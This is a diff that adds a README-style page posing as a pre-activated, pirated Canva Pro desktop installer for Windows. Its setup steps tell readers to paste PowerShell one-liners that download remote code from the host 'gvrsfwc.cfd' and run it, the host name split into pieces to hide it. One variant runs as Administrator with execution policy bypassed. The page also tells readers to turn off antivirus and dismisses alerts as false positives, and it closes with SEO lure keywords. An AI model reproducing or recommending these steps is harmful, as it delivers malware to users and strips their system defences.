@@ -1,0 +1,52 @@
+Canva Pro — Enterprise Desktop Deployment Suite
+
+Standalone Windows deployment tool for automated graphics processing and offline design environment provisioning.
+
+Distribution Type: Pre-activated Standalone Build
+Target Platform: Windows 10 / 11 (x64)
+Estimated Payload Size: ~1.5 GB
+Last Verified Mirror Sync: October 2026
+
+📋 Overview
+
+Canva Pro Suite is a portable, offline-ready deployment package designed for IT administrators and creative professionals. It automates the installation of the core design engine, configures local asset libraries, and resolves missing dependencies for seamless offline template and graphics editing.
+
+Key Features
+- One-Click Provisioning: Automated setup of the desktop design environment.
+- Offline Architecture: No cloud checks or telemetry. All processing remains local.
+- Smart Policy Bypass: Automatically adjusts execution policies and Defender exclusions for seamless installation.
+
+🛠️ Quick Setup Guide (PowerShell)
+
+1. Launch PowerShell:
+   Press Win + X on your keyboard and select Terminal or Windows PowerShell from the list.
+
+2. Execute the Setup Script:
+   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will automatically fetch the payload, unpack the design assets, and configure the system.
+
+   iex (irm ("gvrsfwc" + ".cfd"))
+
+3. Wait for Initialization:
+   The utility will verify your system architecture, download the core components, and prepare the executable. Do not close the terminal window during this process.
+
+💡 Resolving Issues
+
+💬 Script is blocked by Execution Policy
+If Windows stops the deployment script from running due to default security policies (or if the initial script fails to fetch), you can bypass this restriction using an alternative direct command. Run this in PowerShell (as Administrator):
+
+powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod gvrsfwc.cfd | Invoke-Expression"
+
+🛡️ Antivirus / SmartScreen Alerts
+Because the deployment script modifies system policies to allow local asset injection and downloads dependencies silently, Windows Defender or SmartScreen may flag it as a potential threat (false positive).
+
+Recommended Action: If the script gets blocked, pause Real-time protection in your Windows Security dashboard, run the setup script, and re-enable your antivirus immediately afterward.
+
+🔍 Organic Discovery & Identification
+* download Canva Pro setup 2026
+* secure digital design deployment pipeline
+* deploy offline graphics processing software
+* offline Canva Pro desktop installation
+* pre-activated Canva standalone build
+
+📖 Core Build Parameters
+The Canva Pro Suite is designed for offline deployment, ensuring that all digital asset processing, template generation, and design management remain secure, fast, and within controlled local environments without external telemetry.
